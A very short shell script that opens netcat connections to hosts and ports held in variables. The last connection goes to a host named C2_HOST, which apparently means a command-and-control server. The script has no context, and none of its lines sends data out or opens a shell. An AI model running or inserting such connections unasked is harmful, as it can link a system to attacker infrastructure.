#!/bin/sh
nc "$SERVER" "$PORT"
/usr/bin/nc -w 4 "$HOST" "${SERVICE_PORT}"
nc $C2_HOST $C2_PORT
